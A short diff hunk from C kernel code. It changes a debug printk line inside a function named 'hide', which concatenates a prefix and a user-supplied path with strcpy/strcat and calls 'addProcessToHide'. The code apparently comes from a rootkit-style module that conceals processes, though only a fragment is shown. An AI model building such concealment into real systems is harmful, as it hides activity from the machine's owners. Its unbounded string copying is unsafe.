@@ -40,7 +40,7 @@ int hide(const char __user *path) {
   }
   strcpy(tempPath, hide__prefix);
   strcat(tempPath, _path);
-  printk("%p (%d bytes)\n", tempPath, result);
+  printk("%s\n", tempPath);
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
   kfree(_path);
